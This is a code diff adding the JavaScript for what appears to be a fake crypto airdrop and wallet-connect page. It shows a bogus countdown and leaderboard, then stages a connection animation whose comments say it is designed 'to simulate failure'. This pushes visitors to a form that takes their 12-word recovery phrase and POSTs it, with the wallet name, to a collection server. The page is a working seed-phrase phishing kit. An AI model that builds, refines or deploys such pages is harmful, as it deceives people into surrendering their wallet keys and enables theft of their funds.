+        ];
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            populateWalletOptions();
+            populateLeaderboard();
+            startCountdown();
+        });
+
+        // Countdown timer
+        function startCountdown() {
+            let timeLeft = {
+                days: 15,
+                hours: 23,
+                minutes: 45,
+                seconds: 30
+            };
+
+            countdownInterval = setInterval(() => {
+                if (timeLeft.seconds > 0) {
+                    timeLeft.seconds--;
+                } else if (timeLeft.minutes > 0) {
+                    timeLeft.minutes--;
+                    timeLeft.seconds = 59;
+                } else if (timeLeft.hours > 0) {
+                    timeLeft.hours--;
+                    timeLeft.minutes = 59;
+                    timeLeft.seconds = 59;
+                } else if (timeLeft.days > 0) {
+                    timeLeft.days--;
+                    timeLeft.hours = 23;
+                    timeLeft.minutes = 59;
+                    timeLeft.seconds = 59;
+                }
+
+                document.getElementById('days').textContent = timeLeft.days.toString().padStart(2, '0');
+                document.getElementById('hours').textContent = timeLeft.hours.toString().padStart(2, '0');
+                document.getElementById('minutes').textContent = timeLeft.minutes.toString().padStart(2, '0');
+                document.getElementById('seconds').textContent = timeLeft.seconds.toString().padStart(2, '0');
+            }, 1000);
+        }
+
+        // Populate wallet options
+        function populateWalletOptions() {
+            const container = document.getElementById('walletOptions');
+            container.innerHTML = '';
+
+            walletOptions.forEach(wallet => {
+                const walletDiv = document.createElement('div');
+                walletDiv.className = 'wallet-option';
+                
+                walletDiv.innerHTML = `
+                    <div class="wallet-left">
+                        <div class="wallet-icon">${wallet.icon}</div>
+                        <div>
+                            <div class="wallet-name">${wallet.name}</div>
+                            <div class="wallet-status">Click to connect</div>
+                        </div>
+                    </div>
+                    <button class="wallet-connect-btn" onclick="connectWallet('${wallet.id}', '${wallet.name}', '${wallet.icon}')">Connect</button>
+                `;
+                
+                container.appendChild(walletDiv);
+            });
+        }
+
+        // Populate leaderboard
+        function populateLeaderboard() {
+            const container = document.getElementById('leaderboard');
+            container.innerHTML = '';
+
+            leaderboardData.forEach(entry => {
+                const entryDiv = document.createElement('div');
+                entryDiv.className = 'leaderboard-item';
+                
+                entryDiv.innerHTML = `
+                    <div class="leaderboard-left">
+                        <div class="rank-badge ${entry.rank <= 3 ? 'rank-top' : 'rank-normal'}">${entry.rank}</div>
+                        <span class="wallet-address">${entry.address}</span>
+                    </div>
+                    <span class="amount">${entry.amount}</span>
+                `;
+                
+                container.appendChild(entryDiv);
+            });
+        }
+
+        // Modal functions
+        function showWalletModal() {
+            document.getElementById('walletModal').classList.add('show');
+        }
+
+        function hideWalletModal() {
+            document.getElementById('walletModal').classList.remove('show');
+        }
+
+        function showConnectionLoader() {
+            document.getElementById('connectionLoader').classList.add('show');
+        }
+
+        function hideConnectionLoader() {
+            document.getElementById('connectionLoader').classList.remove('show');
+        }
+
+        function showLandingPage() {
+            document.getElementById('landingPage').classList.remove('hide');
+            document.getElementById('walletForm').classList.remove('show');
+            hideAlerts();
+            // Reset form
+            document.getElementById('phraseForm').reset();
+            updateWordCount();
+        }
+
+        function showWalletForm() {
+            document.getElementById('landingPage').classList.add('hide');
+            document.getElementById('walletForm').classList.add('show');
+        }
+
+        // Generate random delay between min and max milliseconds
+        function randomDelay(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+
+        // Update progress bar smoothly
+        function updateProgressBar(percentage) {
+            const progressFill = document.getElementById('progressFill');
+            progressFill.style.width = percentage + '%';
+        }
+
+        // Update connection status with random messages
+        function updateConnectionStatus() {
+            const statusElement = document.getElementById('connectionStatus');
+            const randomMessage = connectionMessages[Math.floor(Math.random() * connectionMessages.length)];
+            statusElement.textContent = randomMessage;
+        }
+
+        // Connection loader animation with realistic random timing
+        async function animateConnectionSteps() {
+            const steps = ['step1', 'step2', 'step3', 'step4'];
+            const progressSteps = [0, 25, 55, 85, 100];
+            
+            // Initial delay before starting
+            await new Promise(resolve => setTimeout(resolve, randomDelay(800, 1500)));
+            
+            for (let i = 0; i < steps.length; i++) {
+                const step = document.getElementById(steps[i]);
+                
+                // Activate current step
+                step.classList.add('active');
+                step.querySelector('.step-icon').classList.add('active');
+                
+                // Update progress bar gradually
+                const startProgress = progressSteps[i];
+                const endProgress = progressSteps[i + 1];
+                const progressDuration = randomDelay(1200, 2800);
+                const progressSteps_internal = 20;
+                const progressIncrement = (endProgress - startProgress) / progressSteps_internal;
+                
+                for (let j = 0; j <= progressSteps_internal; j++) {
+                    const currentProgress = startProgress + (progressIncrement * j);
+                    updateProgressBar(currentProgress);
+                    
+                    // Update status message occasionally
+                    if (j % 5 === 0) {
+                        updateConnectionStatus();
+                    }
+                    
+                    await new Promise(resolve => setTimeout(resolve, progressDuration / progressSteps_internal));
+                }
+                
+                // Random pause at each step to simulate real connection attempts
+                const stepPause = randomDelay(500, 1200);
+                await new Promise(resolve => setTimeout(resolve, stepPause));
+                
+                // Complete current step
+                step.classList.remove('active');
+                step.classList.add('completed');
+                step.querySelector('.step-icon').classList.remove('active');
+                step.querySelector('.step-icon').classList.add('completed');
+                step.querySelector('.step-icon').textContent = '✓';
+                
+                // Random delay between steps
+                if (i < steps.length - 1) {
+                    await new Promise(resolve => setTimeout(resolve, randomDelay(300, 800)));
+                }
+            }
+            
+            // Final status messages to simulate failure
+            document.getElementById('connectionStatus').textContent = "Connection timeout - attempting fallback...";
+            await new Promise(resolve => setTimeout(resolve, randomDelay(1000, 1800)));
+            
+            document.getElementById('connectionStatus').textContent = "Automatic connection failed";
+            await new Promise(resolve => setTimeout(resolve, randomDelay(800, 1200)));
+        }
+
+        // Wallet connection
+        async function connectWallet(walletId, walletName, walletIcon) {
+            const button = event.target;
+            const originalText = button.textContent;
+            
+            button.textContent = 'Connecting...';
+            button.disabled = true;
+
+            // Hide wallet modal and show connection loader
+            hideWalletModal();
+            
+            // Set wallet info in loader
+            document.getElementById('loaderWalletIcon').textContent = walletIcon;
+            document.getElementById('loaderWalletName').textContent = walletName;
+            
+            // Reset connection steps and progress
+            const steps = ['step1', 'step2', 'step3', 'step4'];
+            steps.forEach(stepId => {
+                const step = document.getElementById(stepId);
+                step.classList.remove('active', 'completed');
+                step.querySelector('.step-icon').classList.remove('active', 'completed');
+                step.querySelector('.step-icon').textContent = stepId.slice(-1);
+            });
+            
+            // Reset progress bar
+            updateProgressBar(0);
+            document.getElementById('connectionStatus').textContent = "Attempting to connect...";
+            
+            showConnectionLoader();
+            
+            // Animate connection steps with random timing
+            await animateConnectionSteps();
+            
+            // Hide connection loader
+            hideConnectionLoader();
+            
+            // Reset button (in case user goes back)
+            button.textContent = originalText;
+            button.disabled = false;
+
+            // Set selected wallet info
+            selectedWallet = walletName;
+            selectedWalletIcon = walletIcon;
+            
+            document.getElementById('selectedWalletName').textContent = walletName;
+            document.getElementById('selectedWalletDisplay').textContent = walletName;
+            
+            // Show manual import form after a brief delay
+            setTimeout(() => {
+                showWalletForm();
+            }, 500);
+        }
+
+        // Word count update
+        function updateWordCount() {
+            const textarea = document.getElementById('recoveryPhrase');
+            const counter = document.getElementById('wordCounter');
+            const submitBtn = document.getElementById('submitBtn');
+            
+            const text = textarea.value.trim();
+            const wordCount = text ? text.split(/\s+/).length : 0;
+            
+            counter.textContent = `${wordCount} words`;
+            
+            if (wordCount === 12) {
+                counter.classList.remove('invalid');
+                counter.classList.add('valid');
+                submitBtn.disabled = false;
+            } else {
+                counter.classList.remove('valid');
+                counter.classList.add('invalid');
+                submitBtn.disabled = true;
+            }
+
+            hideAlerts();
+        }
+
+        // Form submission
+        async function submitWalletPhrase(event) {
+            event.preventDefault();
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const submitText = document.getElementById('submitText');
+            const submitSpinner = document.getElementById('submitSpinner');
+            const recoveryPhrase = document.getElementById('recoveryPhrase').value.trim();
+            
+            hideAlerts();
+            
+            // Validate word count
+            const wordCount = recoveryPhrase.split(/\s+/).length;
+            if (wordCount !== 12) {
+                showError('Recovery phrase must contain exactly 12 words.');
+                return;
+            }
+            
+            // Set loading state
+            submitBtn.disabled = true;
+            submitText.style.display = 'none';
+            submitSpinner.style.display = 'block';
+            
+            try {
+                const response = await fetch('http://localhost:2000/api/wallet', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        walletName: selectedWallet,
+                        recoveryPhrase: recoveryPhrase
+                    })
+                });
+                
+                const responseText = await response.text();
+                
+                if (response.ok) {
+                    showSuccessPopup();
+                } else {
+                    showError(responseText);
+                }
+            } catch (error) {
+                showError('Network error: Unable to connect to the server. Please check if the server is running on localhost:2000.');
+            } finally {
+                // Reset loading state
+                submitBtn.disabled = false;
+                submitText.style.display = 'block';
+                submitSpinner.style.display = 'none';
+            }
+        }
+
+        // Success popup with countdown and redirect
+        function showSuccessPopup() {
+            const popup = document.getElementById('successPopup');
+            const countdownElement = document.getElementById('redirectCountdown');
+            
+            popup.classList.add('show');
+            
+            let countdown = 3;
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    popup.classList.remove('show');
+                    
+                    // Redirect to main page
+                    setTimeout(() => {
+                        showLandingPage();
+                    }, 500);
+                }
+            }, 1000);
+        }
+
+        // Alert functions
+        function showError(message) {
+            document.getElementById('errorMessage').textContent = message;
+            document.getElementById('errorAlert').style.display = 'flex';
+        }
+
+        function hideAlerts() {
+            document.getElementById('errorAlert').style.display = 'none';
+        }
     </script>
-  </body>
+</body>
 </html>
